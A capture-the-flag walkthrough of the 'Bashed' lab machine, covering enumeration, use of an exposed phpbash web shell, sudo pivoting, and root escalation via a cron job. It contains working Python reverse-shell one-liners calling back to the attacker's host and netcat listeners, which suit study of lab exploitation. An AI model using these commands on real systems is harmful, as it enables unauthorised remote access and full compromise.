# IP Address: 10.10.10.68

# Enumeration
```
┌──(code㉿kali)-[~]
└─$ nmapAutomator.sh -H 10.10.10.68 -t all

Running all scans on 10.10.10.68

Host is likely running Linux

---------------------Starting Script Scan-----------------------


PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

```

### HTTP
Browsing to the site, we see some potentially useful information. 

![site1](https://github.com/codetantrum/walkthroughs/blob/master/Bashed/images/Pasted%20image%2020211113203204.png)

Fuzzing, we found http://10.10.10.68/dev/phpbash.php which looks to be a php shell.

![site2](https://github.com/codetantrum/walkthroughs/blob/master/Bashed/images/Pasted%20image%2020211113203534.png)

The output shows us that this shell will not allow us to leverage the sudo privileges of the www-data user without a TTY shell. 
```
www-data@bashed
:/var/www/html/dev# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed
:/var/www/html/dev# sudo /bin/sh

sudo: no tty present and no askpass program specified
```

# Exploitation

Create a reverse shell with python and catch it with our netcat listener. 

On target:
```
www-data@bashed
:export RHOST="10.10.14.7";export RPORT=4488;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

--2021-11-13 17:46:38-- http://10.10.14.7/shell.php
```

Locally: 
```
┌──(code㉿kali)-[~]
└─$ nc -nlvp 4488                                                                                  
listening on [any] 4488 ...

connect to [10.10.14.7] from (UNKNOWN) [10.10.10.68] 35358
$ 
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@bashed:/var/www/html/dev$

```

We can run any command as scriptmanager using this format:
```
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager ls
sudo -u scriptmanager ls
phpbash.min.php  phpbash.php
```

To get shell as scriptmanager:
```
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager /bin/bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/var/www/html/dev$ id
id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

user.txt 

![user.txt](https://github.com/codetantrum/walkthroughs/blob/master/Bashed/images/Pasted%20image%2020211113224301.png)

# Privilege Escalation
In looking around the file system, we notice a /scripts directory in /root. In it there is a python script owned by our user (scriptmanager) which produces a test.txt file owned by root. 
```
scriptmanager@bashed:~$ ls -alh /scripts
ls -alh /scripts
total 16K
drwxrwxr--  2 scriptmanager scriptmanager 4.0K Dec  4  2017 .
drwxr-xr-x 23 root          root          4.0K Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Nov 13 19:55 test.txt
scriptmanager@bashed:~$ cd /scripts
cd /scripts
scriptmanager@bashed:/scripts$ cat test.txt     
cat test.txt
testing 123!scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close

```

In current running processes we see that root is running a cron job periodically to execute all .py files in the /scripts directory.

```
root        848  0.0  0.2  50220  2852 ?        S    17:04   0:00  _ /usr/sbin/CRON -f
root        849  0.0  0.0   4508   708 ?        Ss   17:04   0:00  |   _ /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
root        851  0.0  0.7  35080  7072 ?        S    17:04   0:00  |       _ python test2.py
root        852  0.0  0.3  21164  3576 pts/3    Ss+  17:04   0:00  |           _ /bin/bash

```

Create a new python file to execute the reverse shell script used previously, this time on a different port. Wait for the shell.

On target: 
```
scriptmanager@bashed:~$ echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",4499));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > test2.py

```

Locally:
```
┌──(code㉿kali)-[~]                                                                     
└─$ nc -nlvp 4499                                                                                                                                     
listening on [any] 4499 ...                                                                                                                                        
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.68] 59774                                                                                                         
# id
id
uid=0(root) gid=0(root) groups=0(root)

```


# Proof

root.txt

![root.txt](https://github.com/codetantrum/walkthroughs/blob/master/Bashed/images/Pasted%20image%2020211114201829.png)
